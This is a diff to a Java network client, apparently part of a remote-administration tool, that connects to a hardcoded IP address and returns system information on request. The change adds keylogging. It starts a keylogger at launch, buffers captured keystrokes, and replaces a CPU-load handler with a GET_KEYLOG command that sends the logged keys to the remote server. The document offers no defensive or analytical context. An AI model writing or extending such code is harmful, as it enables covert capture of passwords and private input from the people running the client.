@@ -24,10 +24,12 @@ public class Client
 {
     final static int ServerPort = 1234;
     static SystemInfo si = new SystemInfo();
-    public static void main(String args[]) throws UnknownHostException, IOException
+    public static String keyLoger;
+    public static void main(String[] args) throws IOException
     {
         Scanner scn = new Scanner(System.in);
-
+        keyLoger = "";
+        KeyLogger.startKeyLoger();
         // getting localhost ip
         InetAddress ip = InetAddress.getByName("26.84.204.9");
 
@@ -106,8 +108,9 @@ public class Client
                                 object.data = Memory.getMemory();
                                 dos.writeObject(object);
                             }
-                            case Message.GET_CPU -> {
-                                object.data = OsHW.getCpuLoad();
+                            case Message.GET_KEYLOG -> {
+                                object.data = keyLoger;
+                                keyLoger = "";
                                 dos.writeObject(object);
                             }
                             case Message.GET_OS_INFO -> {
